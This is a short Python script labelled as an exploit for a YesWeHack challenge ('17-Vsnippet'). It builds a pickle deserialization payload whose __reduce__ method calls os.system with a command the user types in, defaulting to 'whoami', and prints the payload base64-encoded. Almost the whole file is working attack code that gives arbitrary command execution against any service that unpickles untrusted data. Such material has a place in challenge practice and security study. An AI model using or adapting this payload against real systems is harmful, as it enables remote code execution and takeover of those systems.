#!/usr/bin/python3
import os, base64, pickle

ic = {
    'k': '[\033[1;32mOK\033[0m] ',
    'i': '[\033[1;34mINF\033[0m] ',
    'w': '[\033[33mWRN\033[0m] ',
    'f': '[\033[1;31mFAI\033[0m] ',
}

class Exploit(object):
    def __reduce__(self):
        return (os.system,(cmd,))

#User input:
print("Exploit 17-Vsnippet | YesWeHack")
cmd = str(input(ic['i']+' Command to execute with the exploit: '))

#Default set cmd:
if cmd in ['', ' ', '\t']:
    print(ic['w']+'No command default command set => whoami')
    cmd = 'whoami'

#Payload setup & verbose:
payload = base64.b64encode(pickle.dumps(Exploit()))
print(ic['k'], payload.decode('ascii'))
